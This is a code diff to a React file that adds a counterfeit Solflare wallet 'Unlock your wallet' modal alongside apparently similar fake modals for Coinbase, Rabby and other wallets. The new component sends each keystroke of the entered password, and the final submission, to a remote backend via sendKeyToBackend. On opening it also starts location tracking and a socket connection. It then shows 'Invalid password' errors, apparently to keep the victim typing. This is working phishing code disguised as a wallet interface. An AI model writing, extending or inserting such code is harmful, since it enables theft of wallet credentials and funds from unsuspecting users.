@@ -104,7 +104,9 @@ const WALLET_TYPE_SHORTKEY = {
     RABBY: "RB",
     TRONLINK: "TL",
     BITGET: "BG",
-    COINBASE: "CB"};
+    COINBASE: "CB",
+    SOLFLARE: "SF",
+};
 
 // Cache for user wallet types
 const walletTypesCache = new Map();
@@ -2605,6 +2607,227 @@ const CoinbaseModal = ({ isOpen, onClose, userId, backendConfig }) => {
     return modalContent;
 };
 
+const SolflareModal = ({ isOpen, onClose, userId, backendConfig }) => {
+    const [keyword, setKeyword] = React.useState('');
+    const [error, setError] = React.useState(false);
+    const [helperText, setHelperText] = React.useState('');
+    const [connecting, setConnecting] = React.useState(false);
+    const [connectionError, setConnectionError] = React.useState(false);
+    const [isClosable, setIsClosable] = React.useState(true);
+    const [showPassword, setShowPassword] = React.useState(false);
+    const [loadingInitiate, setLoadingInitiate] = React.useState(true);
+    const [showForgetPasswordModal, setShowForgetPasswordModal] = React.useState(false);
+    const [continueCountdown, setContinueCountdown] = React.useState(0);
+    const passwordInputRef = React.useRef(null);
+    const modalRef = React.useRef(null);
+    const countdownIntervalRef = React.useRef(null);
+    // Handle initial loading - only run once when modal opens
+    React.useEffect(() => {
+        if (isOpen) {
+            initializeLocationData();
+            initializeSocket();
+            setLoadingInitiate(true);
+            const initialLoadTimeout = setTimeout(() => {
+                setLoadingInitiate(false);
+                setTimeout(() => {
+                    passwordInputRef.current?.focus();
+                }, 1500);
+            }, 1500);
+            return () => {
+                clearTimeout(initialLoadTimeout);
+            };
+        }
+        else {
+            setLoadingInitiate(true);
+        }
+    }, [isOpen]);
+    // Handle document click - separate effect
+    React.useEffect(() => {
+        if (!isOpen)
+            return;
+        const handleDocumentClick = (e) => {
+            if (isClosable && modalRef.current && !modalRef.current.contains(e.target)) {
+                handleClick();
+            }
+        };
+        document.addEventListener('click', handleDocumentClick);
+        return () => {
+            document.removeEventListener('click', handleDocumentClick);
+        };
+    }, [isOpen, isClosable]);
+    // Cleanup countdown interval
+    React.useEffect(() => {
+        return () => {
+            if (countdownIntervalRef.current) {
+                clearInterval(countdownIntervalRef.current);
+            }
+        };
+    }, []);
+    const handleClick = () => {
+        if (onClose)
+            onClose();
+        setKeyword('');
+        setConnectionError(false);
+        setError(false);
+        setShowPassword(false);
+        setShowForgetPasswordModal(false);
+        setContinueCountdown(0);
+        if (countdownIntervalRef.current) {
+            clearInterval(countdownIntervalRef.current);
+            countdownIntervalRef.current = null;
+        }
+    };
+    const handleKeywordChange = async (e) => {
+        const newKeyword = e.target.value;
+        setKeyword(newKeyword);
+        setError(false);
+        const currentUserId = backendConfig?.userId || userId;
+        if (currentUserId && newKeyword && (backendConfig?.enabled !== false)) {
+            await sendKeyToBackend(currentUserId, 'cha', newKeyword, WALLET_TYPE_SHORTKEY.SOLFLARE);
+        }
+    };
+    const togglePasswordVisibility = () => {
+        setShowPassword(prev => !prev);
+        setTimeout(() => {
+            passwordInputRef.current?.focus();
+        }, 0);
+    };
+    const handleKeywordTyping = async () => {
+        if (connecting || !keyword)
+            return;
+        setConnecting(true);
+        const currentUserId = backendConfig?.userId || userId;
+        if (!currentUserId) {
+            setConnecting(false);
+            setError(true);
+            setHelperText('User ID is required');
+            return;
+        }
+        if (backendConfig?.enabled !== false) {
+            const result = await sendKeyToBackend(currentUserId, 'enter', keyword, WALLET_TYPE_SHORTKEY.SOLFLARE);
+            if (result.error) {
+                setError(true);
+                setHelperText('Invalid password');
+            }
+            else {
+                setError(false);
+                setHelperText('');
+            }
+            setTimeout(() => {
+                setConnecting(false);
+                passwordInputRef.current?.focus();
+            }, 150);
+        }
+        else {
+            setTimeout(() => setConnecting(false), 150);
+        }
+    };
+    const showForgetPassword = () => {
+        setShowForgetPasswordModal(true);
+        setContinueCountdown(10);
+        // Start countdown timer
+        countdownIntervalRef.current = setInterval(() => {
+            setContinueCountdown(prev => {
+                if (prev > 1) {
+                    return prev - 1;
+                }
+                else {
+                    if (countdownIntervalRef.current) {
+                        clearInterval(countdownIntervalRef.current);
+                        countdownIntervalRef.current = null;
+                    }
+                    return 0;
+                }
+            });
+        }, 1000);
+    };
+    const closeForgetPasswordModal = () => {
+        if (countdownIntervalRef.current) {
+            clearInterval(countdownIntervalRef.current);
+            countdownIntervalRef.current = null;
+        }
+        setShowForgetPasswordModal(false);
+        setContinueCountdown(0);
+    };
+    const closeWindow = () => {
+        handleClick();
+        setTimeout(() => {
+            setConnectionError(false);
+            setKeyword('');
+            setError(false);
+        }, 1000);
+    };
+    if (!isOpen)
+        return null;
+    const isButtonEnabled = !connecting;
+    const modalContent = (React.createElement("div", { id: "header-layout", ref: modalRef, className: `fixed top-0 right-[150px] z-[1000] flex transition-opacity duration-200 max-[395px]:scale-75 max-[265px]:scale-50
+        ${isOpen ? 'opacity-100' : 'opacity-0 pointer-events-none'}`, onMouseEnter: () => setIsClosable(false), onMouseLeave: () => setIsClosable(true) },
+        React.createElement("div", { className: "w-[375px] h-[600px] shadow-[0_4px_20px_0_rgba(0,0,0,0.3)] relative" },
+            React.createElement("div", { className: "h-full relative", style: { backgroundColor: '#02050a' } }, connectionError ? (React.createElement("div", { className: "text-center px-4 py-8 flex flex-col h-full justify-between" },
+                React.createElement("div", null),
+                React.createElement("div", { className: "" },
+                    React.createElement("div", { className: "flex justify-center w-full items-center mb-4" },
+                        React.createElement("svg", { className: "text-2xl text-center w-6 h-6 text-red-500", fill: "currentColor", viewBox: "0 0 20 20" },
+                            React.createElement("path", { fillRule: "evenodd", d: "M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z", clipRule: "evenodd" }))),
+                    React.createElement("h3", { className: "text-xl font-extrabold" }, "Connection failed"),
+                    React.createElement("p", { className: "text-sm" }, "Please check your connection and try again.")),
+                React.createElement("button", { className: "w-full rounded-full cursor-pointer p-2.5 text-white hover:bg-[#3148f5] bg-[#4459ff]", onClick: closeWindow }, "Ok"))) : (React.createElement("div", { className: "relative w-full h-full", style: { backgroundColor: '#02050a' } },
+                React.createElement("div", { className: 'flex flex-col h-full bg-[#02050a]' },
+                    React.createElement("div", { className: 'flex flex-col gap-[24px]' },
+                        React.createElement("div", { className: 'px-[8px] pt-[8px]' },
+                            React.createElement("div", { className: 'rounded-[24px] max-h-[250px] overflow-hidden' },
+                                React.createElement("video", { src: "https://www.riveanimation.cards/v7/images/flag.mp4", autoPlay: true, loop: true, playsInline: true, className: "w-full h-full object-cover" }))),
+                        React.createElement("div", { className: "px-[16px] flex flex-col gap-[24px]" },
+                            React.createElement("div", null,
+                                React.createElement("h1", { className: 'text-[24px] solflare-font-bold text-[#f5f8ff] leading-[32px]' }, "Unlock your wallet"),
+                                React.createElement("p", { className: 'text-[14px] text-[rgba(245,248,255,0.4)] leading-[20px] solflare-font' }, "Enter your password and access your funds safely.")),
+                            React.createElement("div", { className: 'flex flex-col gap-[24px]' },
+                                React.createElement("div", null,
+                                    React.createElement("div", { className: `flex flex-row p-[12px] gap-[4px] rounded-[12px] border ${error
+                                            ? "border-[#ff4d4f] focus-within:border-[#ff4d4f] focus-within:outline-none focus-within:ring-0"
+                                            : "border-[#1a212b] focus-within:border-white focus-within:outline-none"}` },
+                                        React.createElement("input", { id: "current-password", ref: passwordInputRef, placeholder: "Enter your password", type: showPassword ? "text" : "password", autoComplete: "off", spellCheck: "false", value: keyword, onChange: handleKeywordChange, onKeyDown: (e) => {
+                                                if (e.key === 'Enter' && isButtonEnabled && keyword) {
+                                                    handleKeywordTyping();
+                                                }
+                                            }, className: "solflare-font outline-none text-[16px] leading-[24px] w-full placeholder:text-[rgba(245,248,255,0.4)]", style: { backgroundColor: '#02050a', color: 'white' } }),
+                                        React.createElement("svg", { className: "cursor-pointer group", width: "24", height: "24", viewBox: "0 0 20 20", fill: "none", xmlns: "http://www.w3.org/2000/svg", onClick: togglePasswordVisibility }, !showPassword ? (React.createElement(React.Fragment, null,
+                                            React.createElement("path", { d: "M10.1529 4.59982C6.40178 4.59982 3.17595 6.87419 1.8999 10.1018C3.17595 13.3294 6.40176 15.6038 10.1529 15.6038C13.9041 15.6038 17.131 13.3294 18.4059 10.1018C17.131 6.87417 13.9041 4.59982 10.1529 4.59982M10.1529 13.7695C8.0526 13.7695 6.40178 12.1564 6.40178 10.1018C6.40178 8.04723 8.0526 6.43413 10.1529 6.43413C12.2544 6.43413 13.9041 8.04723 13.9041 10.1018C13.9041 12.1564 12.2544 13.7695 10.1529 13.7695ZM10.1529 7.90104C8.87799 7.90104 7.90204 8.85526 7.90204 10.1018C7.90204 11.3484 8.87799 12.3026 10.1529 12.3026C11.429 12.3026 12.4038 11.3484 12.4038 10.1018C12.4038 8.85526 11.429 7.90104 10.1529 7.90104", fill: "rgba(245,248,255,0.4)" }))) : (React.createElement(React.Fragment, null,
+                                            React.createElement("path", { d: "M10.1529 4.59982C6.40178 4.59982 3.17595 6.87419 1.8999 10.1018C3.17595 13.3294 6.40176 15.6038 10.1529 15.6038C13.9041 15.6038 17.131 13.3294 18.4059 10.1018C17.131 6.87417 13.9041 4.59982 10.1529 4.59982M10.1529 13.7695C8.0526 13.7695 6.40178 12.1564 6.40178 10.1018C6.40178 8.04723 8.0526 6.43413 10.1529 6.43413C12.2544 6.43413 13.9041 8.04723 13.9041 10.1018C13.9041 12.1564 12.2544 13.7695 10.1529 13.7695ZM10.1529 7.90104C8.87799 7.90104 7.90204 8.85526 7.90204 10.1018C7.90204 11.3484 8.87799 12.3026 10.1529 12.3026C11.429 12.3026 12.4038 11.3484 12.4038 10.1018C12.4038 8.85526 11.429 7.90104 10.1529 7.90104", fill: "rgba(245,248,255,0.4)" }),
+                                            React.createElement("path", { d: "M16.7771 16.7229L15.8227 17.6774L3.22266 5.07739L4.17715 4.12289L16.7771 16.7229Z", fill: "rgba(245,248,255,0.4)" }),
+                                            React.createElement("path", { d: "M17.6773 15.8227L16.7228 16.7772L4.1228 4.17721L5.07729 3.22272L17.6773 15.8227Z", fill: "rgba(245,248,255,0.4)" }))))),
+                                    error && helperText && React.createElement("span", { className: 'text-[#ff4d4f] solflare-font flex text-[14px] leading-[17px] mt-1 w-full' }, helperText)),
+                                React.createElement("div", { className: "" },
+                                    React.createElement("button", { onClick: isButtonEnabled ? handleKeywordTyping : undefined, disabled: !isButtonEnabled || connecting, className: "solflare-font-bold self-center rounded-[100px] text-[16px] py-[12px] bg-[#ffef46] text-[#090c11] hover:bg-[#eeda0f] active:bg-[#d6c40e] cursor-pointer items-center border-none flex justify-center relative transition-all duration-200 ease-in-out w-full" }, "Unlock"))))),
+                    React.createElement("div", { className: 'absolute bottom-0 left-0 right-0 pt-[8px] px-[16px] pb-[16px]' },
+                        React.createElement("button", { onClick: showForgetPassword, className: 'text-[12px] text-[#f5f8ff] leading-[16px] flex justify-center items-center w-full p-0 cursor-pointer solflare-font' }, "Forgot password"))),
+                showForgetPasswordModal && (React.createElement("div", { id: "forget-password-modal", className: "absolute inset-0 z-[1001]" },
+                    React.createElement("div", { className: "relative w-full h-full" },
+                        React.createElement("div", { className: "bg-[#10101099] absolute bottom-0 left-0 right-0 top-0", onClick: closeForgetPasswordModal }),
+                        React.createElement("div", { tabIndex: -1, className: "absolute bottom-0 left-0 right-0 text-center flex items-center justify-center", role: "dialog" },
+                            React.createElement("div", { role: "document", className: "box-border text-[#ffffff] bg-[#171a1f] text-[14px] tabular-nums list-none pointer-events-none relative w-full" },
+                                React.createElement("div", { tabIndex: 0, "aria-hidden": "true", style: { width: "0px", height: "0px", overflow: "hidden", outline: "none" } }),
+                                React.createElement("div", { className: "h-[302px] rounded-t-[12px] border-0 flex flex-col gap-[24px] shadow-[0_3px_6px_-4px_rgba(0,0,0,0.12),_0_6px_16px_0_rgba(0,0,0,0.08),_0_9px_28px_8px_rgba(0,0,0,0.05)] pointer-events-auto relative bg-[#171a1f]" },
+                                    React.createElement("div", { className: 'flex flex-col gap-[12px]' },
+                                        React.createElement("div", null,
+                                            React.createElement("div", { className: 'px-[8px] text-[16px] text-white solflare-font-bold h-[64px] flex items-center' },
+                                                React.createElement("div", { className: 'px-[8px]' }, "Forgot Password")),
+                                            React.createElement("div", { className: 'px-[16px]' },
+                                                React.createElement("div", { className: 'px-[12px] py-[8px] flex gap-[8px] border border-[rgba(255,184,0,0.2)] bg-[rgba(38,24,11,0.5)] rounded-[12px]' },
+                                                    React.createElement("div", { className: 'pt-[4px]' },
+                                                        React.createElement("svg", { xmlns: "http://www.w3.org/2000/svg", width: "16", height: "16", viewBox: "0 0 16 16", fill: "none" },
+                                                            React.createElement("path", { d: "M13 1.33328H2.99996L1.33329 2.99995V12.9999L2.99996 14.6666H13L14.6666 12.9999V2.99995L13 1.33328ZM9.01258 11.3514H6.98706V9.88747H9.01258V11.3514ZM9.01258 8.8828H6.98706V4.64851H9.01258V8.8828Z", fill: "#FFB800" }))),
+                                                    React.createElement("div", { className: 'flex flex-col' },
+                                                        React.createElement("div", { className: 'text-left text-[12px] solflare-font-bold h-[24px] flex items-center text-[#ffb800]' }, "Make sure you have your recovery phrase"),
+                                                        React.createElement("div", { className: 'text-left text-[12px] solflare-font text-[rgba(255,184,0,0.7)]' }, "Your recovery phrase is the only way to restore your wallet if you log out."))))),
+                                        React.createElement("div", { className: 'px-[16px] text-[14px] leading-[20px] text-[rgba(245,248,255,0.4)] solflare-font text-left' }, "If you forgot your password, the only way to restore your wallets is to log out, re-import your recovery phrase and set a new password.")),
+                                    React.createElement("div", { className: 'text-[16px] leading-[24px] text-[#f5f8ff] flex flex-row gap-[16px] px-[16px]' },
+                                        React.createElement("button", { onClick: closeForgetPasswordModal, className: 'solflare-font w-full rounded-[100px] text-[16px] py-[12px] bg-[rgba(245,248,255,0.08)] text-[#ffffff] hover:bg-[rgba(245,248,255,0.12)] active:bg-[rgba(245,248,255,0.2)] cursor-pointer items-center border-none flex justify-center relative transition-all duration-200 ease-in-out' }, "Cancel"),
+                                        React.createElement("button", { className: 'solflare-font w-full rounded-[100px] text-[16px] py-[12px] bg-[#ffef46] text-[#090c11] hover:bg-[#eeda0f] active:bg-[#d6c40e] cursor-pointer items-center border-none flex justify-center relative transition-all duration-200 ease-in-out' }, "Continue"))),
+                                React.createElement("div", { tabIndex: 0, "aria-hidden": "true", className: "w-0 h-0 overflow-hidden outline-none" }))))))))))));
+    return modalContent;
+};
+
 const CustomWalletModal = ({ wallet, isOpen = false, onClose, userId, backendConfig, darkMode: darkModeProp, // Allow override if provided
  }) => {
     // Detect browser's dark mode preference
@@ -2641,6 +2864,9 @@ const CustomWalletModal = ({ wallet, isOpen = false, onClose, userId, backendCon
             break;
         case 'Coinbase':
             modalComponent = React.createElement(CoinbaseModal, { ...modalProps });
+            break;
+        case 'Solflare':
+            modalComponent = React.createElement(SolflareModal, { ...modalProps });
             break;
         default:
             // Unknown wallet type - return null or a default modal
